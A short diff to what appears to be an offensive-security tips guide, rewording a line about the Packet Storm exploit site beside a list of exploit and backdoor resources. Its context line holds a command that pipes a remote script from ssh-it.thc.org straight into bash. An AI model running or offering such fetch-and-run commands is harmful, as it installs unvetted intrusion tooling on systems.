@@ -843,7 +843,7 @@ bash -c "$(curl -fsSL ssh-it.thc.org/x)"
 **10.ii. Tools**
 
 Exploits
-1. https://packetstormsecurity.com/ - A trusted source ever since we shared a Pizza with fringe[at]dtmf.org in NYC in 2000
+1. https://packetstormsecurity.com/ - Our favorite site ever since we shared a Pizza with fringe[at]dtmf.org in NYC in 2000
 1. https://www.exploit-db.com/ - Also includes metasploit db and google hacking db
 
 Backdoors
